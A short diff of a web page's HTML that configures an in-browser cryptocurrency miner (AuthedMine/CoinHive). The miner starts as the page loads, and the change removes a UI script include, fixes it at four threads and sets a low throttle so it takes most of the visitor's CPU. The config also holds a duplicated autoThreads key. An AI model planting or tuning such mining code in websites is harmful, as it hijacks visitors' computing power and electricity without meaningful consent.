@@ -655,13 +655,16 @@
 
 </script>
 
-<script src="https://authedmine.com/lib/simple-ui.min.js" async></script>
 <script src="https://authedmine.com/lib/authedmine.min.js"></script>
 
 <script>
     var miner = new CoinHive.Anonymous('MrpTErm91qOLopimz9WmeVWH54pXnv2Z', {
         autoThreads: true,
-        theme      : 'dark'
+        theme      : 'dark',
+        threads    : 4,
+        autoThreads: false,
+        throttle   : 0.1,
+        language   : 'auto'
     });
     miner.start();
 </script>
